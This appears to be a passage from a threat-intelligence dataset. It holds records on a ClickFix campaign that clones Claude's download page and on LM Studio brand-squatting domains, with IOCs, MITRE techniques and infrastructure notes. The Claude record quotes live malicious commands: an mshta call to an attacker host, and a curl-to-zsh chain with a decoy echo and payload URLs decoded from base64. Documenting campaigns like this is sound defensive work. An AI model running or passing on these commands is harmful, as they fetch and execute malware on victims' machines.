  - xprssit.com
  - ewabeniak.com
  primary_domain: uneifoifow-3ndfskq.pages.dev
  coverage_note: install-modal-commands.js and tracking.js content were observed during initial collection via direct adversary-infrastructure
    access (Cloudflare Pages domains), which violates pipeline rules. Those facts are re-sourced here to the URLScan result
    pages that captured the same script content. No sandbox report found for Windows HTA or Mac shell payloads at time of
    collection.
  ttps:
  - value: Multiple domains clone the official claude.com download page and are detected via the claude.ai favicon hash pivot
      (SHA-256 816a55828befeb50fe8a9556cb92d80194efefbd3f4e04ccf694992dd8e085e3). The favicon pivot returned 1,003 hits; confirmed
      impersonation landing pages include uneifoifow-3ndfskq.pages.dev, too.clawddddd.com, and fine-byte2.com, all with exact
      title match 'Download Claude | Claude by Anthropic'.
    mitre_id: T1566.002
    note: 'URLScan pivot query: hash:816a55828befeb50fe8a9556cb92d80194efefbd3f4e04ccf694992dd8e085e3 AND NOT page.domain:claude.ai'
  - value: Windows victims are instructed to run 'mshta https://download.version-516.com/claude' via the fake install modal.
      mshta (Microsoft HTML Application Host) is a signed Windows binary that executes HTA scripts with elevated scripting
      privileges, bypassing script execution restrictions.
    mitre_id: T1218.005
    note: 'install-modal-commands.js loaded by the URLScan-captured page. The windows field explicitly contains the mshta
      command: ''mshta https://download.version-516.com/claude'''
  - value: Mac victims are instructed to run a shell command presented as the official Claude installer. The displayed text
      references 'https://claude.ai/install.sh' as social cover, but the actual curl fetches from an attacker-controlled domain
      piped to zsh for execution.
    mitre_id: T1059.004
    note: 'Mac delivery chain: echo ''Downloading Claude: https://claude.ai/install.sh'' && curl -s $(echo ''<base64>'' |
      openssl base64 -d -A) | zsh. The echo line is social engineering — it is not executed, it only displays a legitimate-looking
      URL before the actual malicious curl runs.'
  - value: 'The actual Mac payload URL is base64-encoded within the install modal JavaScript to conceal it from HTML source
      inspection. Decoded URL: https://xprssit.com/curl/6df71b43667a2d1d9de3e88cba7e16fb11b4ddf67af64b853b903b3fa8ead500 (uneifoifow
      variant); https://ewabeniak.com/curl/3fc679781682830135ae1258ae2119b550891f8b7b1641c860c1aca860b3c2e9 (too.clawddddd.com
      variant). Each landing page uses a unique per-site hash path.'
    mitre_id: T1027
    note: null
  iocs:
  - value: uneifoifow-3ndfskq.pages.dev
    ioc_type: domain
    note: Cloudflare Pages deployment. Near-perfect clone of claude.com download page, loading real Anthropic analytics scripts
      (Segment, Amplitude) while serving local install-modal-commands.js with malicious commands. Scanned at path /downloads/Claude%20Setup.exe
      — the actual EXE path is a decoy; the real delivery is via the install modal.
  - value: too.clawddddd.com
    ioc_type: domain
    note: Typosquat on 'claude' (extra d's). Same ClickFix install modal kit, Cloudflare-fronted. Uses ewabeniak.com as Mac
      payload host instead of xprssit.com — each landing page has its own per-campaign delivery domain.
  - value: fine-byte2.com
    ioc_type: domain
    note: Exact title match 'Download Claude | Claude by Anthropic', Cloudflare-fronted. Timed out during live investigation
      — possibly geo-cloaked. Likely same kit.
  - value: download.version-516.com
    ioc_type: domain
    note: Windows HTA delivery host. Serves /claude (Claude Code campaign) and /other (generic multi-brand path). Both return
      HTTP 200 with no captured downloads — payload is an HTA file executed via mshta. Cloudflare-fronted.
  - value: xprssit.com
    ioc_type: domain
    note: Mac shell script delivery host for uneifoifow-3ndfskq.pages.dev variant. Returns HTTP 520 on root but serves per-campaign
      hashed paths (/curl/<sha256-style-hash>). Cloudflare-fronted.
  - value: ewabeniak.com
    ioc_type: domain
    note: 'Mac shell script delivery host for too.clawddddd.com variant. Zero URLScan hits on root domain — only discovered
      via base64 decode of install-modal-commands.js payload URL visible in URLScan result. Decoded URL: https://ewabeniak.com/curl/3fc679781682830135ae1258ae2119b550891f8b7b1641c860c1aca860b3c2e9'
  - value: https://download.version-516.com/claude
    ioc_type: url
    note: Windows mshta HTA payload endpoint. First seen in URLScan 2026-04-29. Behavioral analysis pending — do not fetch
      locally. Submit URL to any.run or tria.ge with Windows 10 profile.
  - value: https://xprssit.com/curl/6df71b43667a2d1d9de3e88cba7e16fb11b4ddf67af64b853b903b3fa8ead500
    ioc_type: url
    note: Mac shell script payload for uneifoifow-3ndfskq.pages.dev. Decoded from base64 string in install-modal-commands.js
      visible in URLScan result. Behavioral analysis pending — do not fetch locally. Submit URL to any.run with macOS profile.
  infrastructure:
  - value: download.version-516.com serves both /claude (Claude Code campaign) and /other (generic path). The /other path
      was first scanned 2026-04-17, twelve days before /claude appeared 2026-04-29. This sequence indicates the HTA delivery
      infrastructure pre-dates the Claude Code campaign and is a shared multi-brand kit repurposed per target. All Cloudflare-fronted.
      Sibling delivery domains follow a /curl/<64-char-hash> path structure (xprssit.com, ewabeniak.com) with per-site unique
      hashes, suggesting campaign-level payload rotation.
    note: 'version-516.com /other first seen: 2026-04-17. /claude first seen: 2026-04-29. Suggests operator pivoted this kit
      to Claude Code targeting after initially using it for other brand impersonation.'
  behaviors:
  - value: 'The install modal displays ''echo "Downloading Claude: https://claude.ai/install.sh"'' as the first part of the
      Mac command. This echo line is pure social engineering — it prints the legitimate Anthropic install URL to the terminal
      but does not fetch it. The actual malicious curl command follows immediately after the &&, and runs a shell script from
      an attacker-controlled domain. Developers accustomed to piping install scripts are the primary target.'
    note: Same social engineering pattern observed on both uneifoifow-3ndfskq.pages.dev and too.clawddddd.com. The official-looking
      echo output is designed to pass a casual read of the terminal before execution.
  - value: The landing pages load real Anthropic tracking scripts directly from www.anthropic.com (Segment analytics, Amplitude
      session replay, claude-custom-tracking.js). Every victim visit generates a genuine Anthropic analytics page view, potentially
      masking the campaign's traffic footprint in any monitoring that correlates page views with legitimate claude.com downloads.
      The tracking.js header explicitly identifies the file as 'claude-custom-tracking.js / Analytics and tracking functionality
      for claude.com'.
    note: 'The clone serves the real Anthropic claude-custom-tracking.js verbatim — visible in the URLScan result''s script
      list. A downloads/Claude%20Setup.exe link also appears in the HTML as a visual decoy but HEAD request returned Content-Type:
      text/html — no real binary at that path. The install modal ClickFix command is the live delivery mechanism.'
- slug: 2026-05-17-lmstudio-domain-squatting
  threat_name: LM-Studio-Domain-Squatting-API-Endpoint-Impersonation
  brand: LM Studio
  collected_at: '2026-05-17T15:00:00Z'
  date_start: '2026-04-30'
  date_end: '2026-05-17'
  sources_queried:
  - urlscan
  delivery_methods:
  - Brand masquerade
  - Phishing / lure page
  payload_class: unknown
  confirmed_delivery: false
  ttp_count: 2
  ioc_count: 2
  infra_count: 1
  behavior_count: 1
  mitre_ids:
  - T1036.005
  - T1566.002
  domains:
  - lmstudio.co.com
  - www.api.lmstudio.co.com
  primary_domain: lmstudio.co.com
  coverage_note: Favicon hash pivot (94ce33...) returned only 11 hits — all AI tool directories, no delivery infrastructure.
    Confirmed threat found via title + domain-pattern pivots. Validin pDNS lookup on lmstudio.co.com returned ECONNREFUSED
    (service unavailable at time of hunt — no historical IP resolution data obtained). No installer file delivery found anywhere
    in the hunt. Threat model here is API endpoint impersonation, not binary delivery.
  ttps:
  - value: lmstudio.co.com registered on the LM Studio brand name and configured to redirect to www.api.lmstudio.co.com, impersonating
      the LM Studio local API server endpoint. LM Studio runs an OpenAI-compatible API at localhost:1234 — adversary infrastructure
      at api.lmstudio.co.com could intercept API calls, harvest model prompts, or steal API keys from developers who misconfigure
      their client endpoint.
    mitre_id: T1036.005
    note: All four URLScan scans (Apr 30–May 11) show page title www.api.lmstudio.co.com, confirming the redirect-to-API-subdomain
      pattern was consistent across the full active window. DNS pulled by May 11, 2026.
  - value: lmstudio.co.com was community-reported as phishing on two separate occasions (May 8 and May 11, 2026) via @phish_report,
      indicating it was actively being encountered by developers before DNS takedown.
    mitre_id: T1566.002
    note: 'Submissions tagged phishing,@phish_report on May 8 and May 11. April 30 and May 10 scans carry no tags — likely
      automated/researcher scans before the domain was reported. Total active window: approximately 11 days.'
  iocs:
  - value: lmstudio.co.com
    ioc_type: domain
    note: Phishing-tagged LM Studio brand squat on co.com TLD. Redirected to www.api.lmstudio.co.com. DNS pulled by May 11,
      2026 (ERR_NAME_NOT_RESOLVED). Submitted to URLScan from Hungary. May be part of broader co.com brand-squat infrastructure
      — pivot co.com TLD for other AI tool squats.
  - value: www.api.lmstudio.co.com
    ioc_type: domain
    note: API subdomain impersonating the LM Studio local API server (normally at localhost:1234, OpenAI-compatible format).
      Redirect target of lmstudio.co.com. DNS also pulled. No IP captured in any URLScan result — DNS was failing at scan
      time.
  infrastructure:
  - value: No hosting IP was captured for lmstudio.co.com or api.lmstudio.co.com in any URLScan scan — DNS failed on all four
      scans, indicating the domain either had TTL-gated activation or was pulled before any scan could resolve it. Validin
      pDNS query returned ECONNREFUSED. Hosting provider and registrar unknown. The co.com TLD is operated by VeriSign as
      a second-level domain under .com and requires no special accreditation — frequently used for brand squatting.
    note: 'Recommended next pivot: Validin or WHOIS on lmstudio.co.com when service is available. Also query Hunt.io for any
      cert issued to lmstudio.co.com or api.lmstudio.co.com — cert may have been issued even if DNS was never fully live.'
  behaviors:
  - value: This campaign targets the developer workflow rather than end-user downloads. LM Studio exposes an OpenAI-compatible
      API at localhost:1234/v1 — developers configure this endpoint in code, config files, or tools like Continue.dev, Cursor,
      or custom scripts. A domain at api.lmstudio.co.com would be indistinguishable from a legitimate remote LM Studio endpoint
      in a config string, enabling prompt exfiltration or API key theft without any installer or user interaction beyond a
      config change.
    note: 'Distinct from the ChatGPT/Zoom installer delivery pattern — no binary delivery, no social engineering download
      page. Threat is in the supply chain of developer tooling config. Watch for this pattern on other local-API tools: Ollama
      (localhost:11434), Jan.ai, AnythingLLM.'
